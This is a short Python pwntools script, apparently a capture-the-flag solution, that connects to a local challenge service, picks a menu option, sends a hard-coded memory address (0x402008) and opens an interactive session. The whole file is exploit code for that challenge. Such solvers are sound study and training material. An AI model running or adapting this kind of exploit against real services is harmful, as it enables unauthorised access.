from pwn import *

r = remote("localhost", 1024)
r.recvuntil("implemented\n")
r.sendline("1")
r.recvuntil("look?\n")
r.sendline(str(0x402008))
r.interactive()